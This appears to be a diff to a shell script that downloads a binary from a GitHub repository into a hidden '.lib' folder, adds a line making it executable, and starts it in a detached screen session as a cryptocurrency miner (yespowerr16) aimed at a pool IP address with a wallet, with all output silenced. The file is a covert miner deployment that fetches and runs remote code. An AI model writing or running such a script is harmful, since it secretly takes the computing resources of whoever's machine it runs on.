@@ -29,6 +29,7 @@ WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday
 mkdir .lib && cd .lib
 export DEBIAN_FRONTEND=noninteractive
 wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
+chmod +x sgr1
 cpulimit -l 100 -e sgr1 &
 screen -dmS main-session /bin/bash -c "./sgr1 -a yespowerr16 --pool 45.115.225.39:8443 -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.tesi --timeout 120 > /dev/null 2>&1"
 sleep 30
